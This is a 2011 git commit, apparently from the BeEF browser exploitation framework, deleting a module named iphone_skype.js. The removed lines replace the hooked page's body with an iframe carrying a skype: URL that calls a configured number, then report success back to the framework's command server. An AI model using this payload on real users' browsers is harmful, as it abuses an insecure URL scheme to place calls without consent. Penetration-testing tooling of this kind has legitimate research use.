5db2541cc2b53c91e0aee3b160d6e8dc28c584e1
xntrik <xntrik@b87d56ec-f9c0-11de-8c8a-61c5e9addfc9>
2011-02-15 13:20:25 +0000

    issue 269 : insecure URL schemes work in multiple browsers
    git-svn-id: https://beef.googlecode.com/svn/trunk@740 b87d56ec-f9c0-11de-8c8a-61c5e9addfc9

--- modules/commands/host/iphone_skype/iphone_skype.js
+++
@@ -1,5 +0,0 @@
-beef.execute(function() {
-	document.body.innerHTML = "<iframe src=skype:<%= @tel_num %>?call></iframe>";
-
-    beef.net.sendback("<%= @command_url %>", <%= @command_id %>, "result=IFrame Created!");
-});
